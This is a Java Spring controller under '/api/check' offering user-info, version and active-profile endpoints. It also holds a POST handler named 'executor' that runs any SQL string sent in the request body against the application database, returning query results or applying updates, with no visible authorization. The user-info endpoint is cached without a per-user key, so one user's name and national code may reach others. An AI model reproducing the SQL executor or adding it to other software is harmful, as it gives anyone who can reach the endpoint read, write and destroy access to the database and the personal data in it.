package com.nicico.internal.sales.userinfo.controller;

import com.nicico.copper.core.SecurityUtil;
import com.nicico.internal.sales.userinfo.dto.UserInfoDto;
import io.swagger.v3.oas.annotations.Operation;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.core.env.Environment;
import org.springframework.http.ResponseEntity;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

@RestController
@RequiredArgsConstructor
@RequestMapping("/api/check")
public class CheckController {
	private final Environment env;
	private final JdbcTemplate jdbcTemplate;
	@Value("${nicico.version}")
	private String apiVersion;

	@Cacheable("user-info")
	@Operation(summary = "Get current user information detail")
	@GetMapping("/user-info")
	public ResponseEntity<UserInfoDto> getCurrentUserInfo() {
		UserInfoDto userInfoDto = new UserInfoDto();
		userInfoDto.setAuthority(SecurityUtil.getAuthorities());
		userInfoDto.setUsername(SecurityUtil.getUsername());
		userInfoDto.setFirstName(SecurityUtil.getFirstName());
		userInfoDto.setUserId(SecurityUtil.getUserId());
		userInfoDto.setLastName(SecurityUtil.getLastName());
		userInfoDto.setNationalCode(SecurityUtil.getNationalCode());
		return ResponseEntity.ok(userInfoDto);
	}

	@Cacheable("version")
	@Operation(summary = "Get application version")
	@GetMapping("/version")
	public ResponseEntity<String> getVersion() {
		return ResponseEntity.ok(apiVersion);
	}

	@Operation(summary = "Active profile loaded")
	@GetMapping("/active-profile")
	public Map<String, Object> getVersionWithEnv() {
		return Map.of("environment", env.getActiveProfiles());
	}

	@PostMapping
	public ResponseEntity<?> executor(@RequestBody String syntax) {
		try {
			String trimmed = syntax.trim().toLowerCase();
			if (trimmed.startsWith("select")) {
				List<Map<String, Object>> result = jdbcTemplate.queryForList(syntax);
				return ResponseEntity.ok(result);
			} else {
				int rows = jdbcTemplate.update(syntax);
				return ResponseEntity.ok("Rows affected: " + rows);
			}
		} catch (Exception e) {
			return ResponseEntity.badRequest().body("Error: " + e.getMessage());
		}
	}
}
